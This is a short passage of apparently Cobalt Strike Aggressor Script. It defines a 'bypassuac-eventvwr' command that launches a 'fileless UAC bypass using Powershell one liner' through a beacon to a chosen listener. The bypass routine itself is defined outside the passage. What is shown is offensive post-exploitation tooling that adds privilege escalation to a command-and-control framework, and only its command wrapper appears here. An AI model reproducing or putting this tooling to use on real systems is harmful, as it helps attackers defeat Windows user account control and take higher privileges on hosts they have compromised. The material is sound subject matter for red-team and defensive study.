	"Generates a fileless UAC bypass using Powershell one liner");

alias bypassuac-eventvwr {
	if ($2 is $null) {
		openPayloadHelper(lambda({
			eventvwr($bid, $1);
		}, $bid => $1));
	}
	else if (listener_info($2) is $null) {
		berror($1, "Could not find listener $2");
	}
	else {
		eventvwr($1, $2);
	}
}

